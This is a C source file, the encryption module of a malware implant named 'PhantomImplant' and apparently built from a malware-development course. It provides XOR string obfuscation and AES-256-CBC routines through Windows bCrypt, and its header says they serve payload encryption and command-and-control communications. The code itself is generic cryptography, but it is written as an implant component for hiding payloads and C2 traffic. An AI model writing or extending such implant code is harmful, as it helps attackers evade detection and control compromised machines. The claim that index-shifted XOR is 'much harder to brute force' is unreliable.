/**
 * PhantomImplant - Encryption Module
 *
 * XOR: Fast, lightweight, no dependencies. Good for string obfuscation.
 * AES-256-CBC: Windows bCrypt library. Used for payload encryption and C2 comms.
 *
 * Based on: MalDev Academy Modules 17 (XOR), 19 (AES)
 */

#include "crypto.h"
#include <bcrypt.h>
#include <stdio.h>

#pragma comment(lib, "Bcrypt.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// =============================================
// XOR Encryption - Single byte key
// Bidirectional: same function encrypts and decrypts
// =============================================
VOID XorByOneKey(IN PBYTE pData, IN SIZE_T sDataSize, IN BYTE bKey) {
    for (SIZE_T i = 0; i < sDataSize; i++) {
        pData[i] = pData[i] ^ bKey;
    }
}

// =============================================
// XOR Encryption - Index-expanded key
// Each byte XORed with (key + index), much harder to brute force
// =============================================
VOID XorByiKeys(IN PBYTE pData, IN SIZE_T sDataSize, IN BYTE bKey) {
    for (SIZE_T i = 0; i < sDataSize; i++) {
        pData[i] = pData[i] ^ (bKey + (BYTE)i);
    }
}

// =============================================
// XOR Encryption - Multi-byte repeating key
// Key bytes cycle through the data
// =============================================
VOID XorByInputKey(IN PBYTE pData, IN SIZE_T sDataSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
    for (SIZE_T i = 0, j = 0; i < sDataSize; i++, j++) {
        if (j >= sKeySize)
            j = 0;
        pData[i] = pData[i] ^ bKey[j];
    }
}

// =============================================
// Generate random bytes (for keys/IVs)
// Uses BCryptGenRandom — cryptographically secure, unlike rand()
// =============================================
VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize) {
    if (!NT_SUCCESS(BCryptGenRandom(NULL, pByte, (ULONG)sSize, BCRYPT_USE_SYSTEM_PREFERRED_RNG)))
        for (SIZE_T i = 0; i < sSize; i++) pByte[i] = (BYTE)(i ^ 0xAB); // fallback, should never hit
}

// =============================================
// Internal: AES-256-CBC encryption via bCrypt
// =============================================
static BOOL InstallAesEncryption(PAES pAes) {

    BOOL              bState       = TRUE;
    BCRYPT_ALG_HANDLE hAlgorithm   = NULL;
    BCRYPT_KEY_HANDLE hKeyHandle   = NULL;
    ULONG             cbResult     = 0;
    DWORD             dwBlockSize  = 0;
    DWORD             cbKeyObject  = 0;
    PBYTE             pbKeyObject  = NULL;
    PBYTE             pbCipherText = NULL;
    DWORD             cbCipherText = 0;
    NTSTATUS          status       = 0;

    // Open AES algorithm provider
    status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status)) { bState = FALSE; goto _Cleanup; }

    // Get key object size
    status = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(status)) { bState = FALSE; goto _Cleanup; }

    // Verify 16-byte block size
    status = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(status) || dwBlockSize != 16) { bState = FALSE; goto _Cleanup; }

    // Allocate key object
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (!pbKeyObject) { bState = FALSE; goto _Cleanup; }

    // Set CBC mode
    status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(status)) { bState = FALSE; goto _Cleanup; }

    // Generate symmetric key from raw key bytes
    status = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, pAes->pKey, AES_KEYSIZE, 0);
    if (!NT_SUCCESS(status)) { bState = FALSE; goto _Cleanup; }

    // First call: get required ciphertext buffer size
    status = BCryptEncrypt(hKeyHandle, pAes->pPlainText, pAes->dwPlainSize, NULL, pAes->pIv, AES_IVSIZE, NULL, 0, &cbCipherText, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(status)) { bState = FALSE; goto _Cleanup; }

    // Allocate ciphertext buffer
    pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherText);
    if (!pbCipherText) { bState = FALSE; goto _Cleanup; }

    // Second call: actual encryption
    status = BCryptEncrypt(hKeyHandle, pAes->pPlainText, pAes->dwPlainSize, NULL, pAes->pIv, AES_IVSIZE, pbCipherText, cbCipherText, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(status)) { bState = FALSE; goto _Cleanup; }

_Cleanup:
    if (hKeyHandle) BCryptDestroyKey(hKeyHandle);
    if (hAlgorithm) BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    if (pbKeyObject) HeapFree(GetProcessHeap(), 0, pbKeyObject);
    if (pbCipherText && bState) {
        pAes->pCipherText  = pbCipherText;
        pAes->dwCipherSize = cbCipherText;
    }
    return bState;
}

// =============================================
// Internal: AES-256-CBC decryption via bCrypt
// =============================================
static BOOL InstallAesDecryption(PAES pAes) {

    BOOL              bState       = TRUE;
    BCRYPT_ALG_HANDLE hAlgorithm   = NULL;
    BCRYPT_KEY_HANDLE hKeyHandle   = NULL;
    ULONG             cbResult     = 0;
    DWORD             dwBlockSize  = 0;
    DWORD             cbKeyObject  = 0;
    PBYTE             pbKeyObject  = NULL;
    PBYTE             pbPlainText  = NULL;
    DWORD             cbPlainText  = 0;
    NTSTATUS          status       = 0;

    status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status)) { bState = FALSE; goto _Cleanup; }

    status = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(status)) { bState = FALSE; goto _Cleanup; }

    status = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(status) || dwBlockSize != 16) { bState = FALSE; goto _Cleanup; }

    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (!pbKeyObject) { bState = FALSE; goto _Cleanup; }

    status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(status)) { bState = FALSE; goto _Cleanup; }

    status = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, pAes->pKey, AES_KEYSIZE, 0);
    if (!NT_SUCCESS(status)) { bState = FALSE; goto _Cleanup; }

    // First call: get plaintext buffer size
    status = BCryptDecrypt(hKeyHandle, pAes->pCipherText, pAes->dwCipherSize, NULL, pAes->pIv, AES_IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(status)) { bState = FALSE; goto _Cleanup; }

    pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
    if (!pbPlainText) { bState = FALSE; goto _Cleanup; }

    // Second call: actual decryption
    status = BCryptDecrypt(hKeyHandle, pAes->pCipherText, pAes->dwCipherSize, NULL, pAes->pIv, AES_IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(status)) { bState = FALSE; goto _Cleanup; }

_Cleanup:
    if (hKeyHandle) BCryptDestroyKey(hKeyHandle);
    if (hAlgorithm) BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    if (pbKeyObject) HeapFree(GetProcessHeap(), 0, pbKeyObject);
    if (pbPlainText && bState) {
        pAes->pPlainText  = pbPlainText;
        pAes->dwPlainSize = cbPlainText;
    }
    return bState;
}

// =============================================
// Public: AES Encrypt wrapper
// =============================================
BOOL AesEncrypt(IN PVOID pPlainTextData, IN DWORD sPlainTextSize,
                IN PBYTE pKey, IN PBYTE pIv,
                OUT PVOID* pCipherTextData, OUT DWORD* sCipherTextSize) {

    if (!pPlainTextData || !sPlainTextSize || !pKey || !pIv)
        return FALSE;

    AES Aes = {
        .pKey        = pKey,
        .pIv         = pIv,
        .pPlainText  = pPlainTextData,
        .dwPlainSize = sPlainTextSize
    };

    if (!InstallAesEncryption(&Aes))
        return FALSE;

    *pCipherTextData = Aes.pCipherText;
    *sCipherTextSize = Aes.dwCipherSize;
    return TRUE;
}

// =============================================
// Public: AES Decrypt wrapper
// =============================================
BOOL AesDecrypt(IN PVOID pCipherTextData, IN DWORD sCipherTextSize,
                IN PBYTE pKey, IN PBYTE pIv,
                OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {

    if (!pCipherTextData || !sCipherTextSize || !pKey || !pIv)
        return FALSE;

    AES Aes = {
        .pKey         = pKey,
        .pIv          = pIv,
        .pCipherText  = pCipherTextData,
        .dwCipherSize = sCipherTextSize
    };

    if (!InstallAesDecryption(&Aes))
        return FALSE;

    *pPlainTextData = Aes.pPlainText;
    *sPlainTextSize = Aes.dwPlainSize;
    return TRUE;
}
